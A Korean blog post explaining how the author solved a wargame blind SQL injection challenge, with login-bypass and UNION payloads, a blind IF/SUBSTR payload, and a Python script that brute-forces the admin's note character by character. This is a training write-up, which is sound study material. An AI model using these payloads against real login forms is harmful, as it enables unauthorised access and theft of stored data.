---
title: wargame blindSQLi 풀이
date: 2022-08-30 17:57:00 +0900
tags: [파이썬, 웹크롤링]

---

## 개요

그냥 SQL인젝션은 재미가 없다. 대신 블라인드 SQL 문제를 풀어보자.

---

## 간단한 설명

테이블에서 상품 정보 조회해서 출력해주는 웹사이트를 생각해 보자.

만약 sql 인젝션 공격이 가능하다면, 상품 정보 대신 개인정보를 출력하게 만들 수 있을지도 모른다.

그러나 로그인 페이지에서는 어떨까?

어떤 코드를 주입하더라도, 우리에게 돌아오는 결과는 로그인의 성공/실패 여부 정도일 뿐이다.

로그인에 후 `안녕하세요, ***님!` 같은 메시지가 표시된다면, 어떤 유저로 로그인했는지 정도는 알 수 있겠다.

아무튼 __한 번에 얻을 수 있는 정보량이 매우 제한적__ 이라는 게 문제다.

우리는 __SQL인젝션 공격을 여러 번 수행__ 하면서 얻은 정보를 조합하는 방식으로 이를 해결한다.

---

## 문제 상황

로그인 시 유저의 노트를 보여주는 웹사이트가 있다.

관리자 계정의 note 내용을 알아내자.

```sql
# HINT:
Table user ( id varchar(256) not null primary key, pw varchar(256), note varchar(256))
```

---

## 관찰

메인 페이지는 이렇게 생겼다.

![1](https://user-images.githubusercontent.com/88845385/187412959-dee3b9ea-47d8-409b-97e9-59d159eefd72.png)

회원가입도 할 수 있다. `user`로 회원가입한 뒤 로그인해 보면 이렇게 노트가 표시된다.

![3](https://user-images.githubusercontent.com/88845385/187412983-e076a6f7-61b8-4fea-bc69-2a8e52f77abd.png)



---

## 일반적인 SQL 인젝션 시도(1)

서버의 SQL 쿼리 요청은 대충 이렇게 생겼을 것이다.

```sql
SELECT * FROM user WHERE id='{id}' and pw='{pw}'
```

만약 id로 `something`, pw로 `1' OR id='admin`를 입력하면 쿼리 구문은

```sql
SELECT * FROM user WHERE id='something' and pw='1' OR id='admin'
```

가 되어 관리자 계정으로 접속될 것이다.

그러나 시도해 보니

![5](https://user-images.githubusercontent.com/88845385/187412997-d5d8d119-d17e-41a0-8ec1-2fad448e5fd1.png)

아하...서버가 공사중이라 노트가 표시되지 않는 모양이다.

---

## 일반적인 SQL 인젝션 시도(2)

아직 포기하기는 이르다. 노트의 내용은 표시하고 있지 않지만, 닉네임이 출력되고 있지 않은가!

닉네임이 출력되는 부분에 note 내용을 끼워넣을 수 있겠다.

```sql
SELECT id FROM user WHERE id='something' and pw='1' UNION SELECT note from user WHERE id='admin'
```

이렇게 작성하면 __UNION__ 앞부분은 공집합이고 뒷부분에서는 관리자의 note 내용이 반환되니 결국 닉네임 대신 note의 내용이 출력될 것이다. 그러나

```
no 'union' or '_'
```

꼼수를 막아 놨다. 간단한 필터링 우회기법인 대소문자 변경(`uNiON` 등)도 통하지 않는 걸로 봐서 이쪽엔 취약점이 없나 보다.

---

## 블라인드 SQL 인젝션 시도

직접적으로 노트를 볼 수 없으니, 다음과 같이 작성해 보자.

```sql
1' OR id=if(SUBSTR(SELECT note FROM user WHERE id='admin', 0, 1)='A','admin','user') #
```

관리자 노트의 첫 번째 글자가 'A'라면 `admin`으로 로그인될 것이고, 그렇지 않다면 `user` 계정으로 로그인될 것이다. 실행해 보면 user로 로그인된다.

이 방법으로 한 글자씩 브루트포스를 돌리면 노트 내용이 얻어진다.

실제로는 파이썬 등을 이용해 구현한다.

```python
def guess(index, char):
    url = 'http://wargame.goatskin.kr:20000/login_form'
    pw = f"1' OR id=IF(BINARY(SUBSTR((SELECT note FROM user WHERE id='admin'), {index}, 1))='{char}','admin','user') #"
    data = {'id':'asd', 'pw':pw}
    res = requests.post(url, data)
        
    return res.text.find('Hi, admin') != -1
```

`index`번째 글자(1부터 시작함)가 `char`인지 여부를 반환해주는 함수이다.

사실 이렇게만 하면 잘 돌아가다 알 수 없는 이유(..?)로 모듈 에러가 난다. 간헐적인 증상이기에 `try-except`문으로 예외처리 하고 반복 시도하면 된다.

이렇게 플래그를 얻었다.

---

## 여담

이 문제도 포스트 작성을 위해 다시 풀어 봤는데, 이전에는 없던 통신 오류 때문에 한참을 헤맸다. 헤더파일도 넣어 보고, https로 바꿔도 보고 이것저것 시도했는데 결국 안 고쳐져서 그냥 오류 예외처리를 해 버렸다는...

실제로도 Dos공격마냥 서버에 무한 요청을 하는 기법이라 이쪽에서 막히는 경우도 있을 것 같다. 이건 진짜로 해킹을 시도할 경우의 이야기지만. 혹시나 해서 하는 말인데 __멀쩡히 돌아가는 서비스에서 SQLi를 시도했다간 잡혀가도 모른다.__ 생각도 하지 말자.